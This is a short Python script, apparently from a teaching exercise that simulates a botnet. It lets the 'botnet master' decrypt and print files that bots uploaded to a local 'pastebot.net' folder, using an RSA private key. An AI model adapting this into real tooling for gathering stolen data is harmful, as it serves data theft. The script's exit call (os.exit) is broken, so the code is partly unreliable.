import os

from key import key_generator
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256


def decrypt_valuables(f):
    # Decrypt the contents of the file.
    # The existing scheme uploads in plaintext
    # As such, we just convert it back to ASCII and print it out
    # decoded_text = str(f, 'ascii')
    # print(decoded_text)
    key = RSA.importKey(open('master_bot_private_key.pem', 'r').read())
    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA256)
    plaintext = str(cipher.decrypt(f), 'ascii')
    print(plaintext)


if __name__ == "__main__":

    if not os.path.exists("master_bot_private_key.pem") or \
            not os.path.exists("master_bot_public_key.pem"):
        key_generator.generate_key_pair()

    fn = input("Which file in pastebot.net does the botnet master want to view? ")
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        os.exit(1)
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    decrypt_valuables(f)
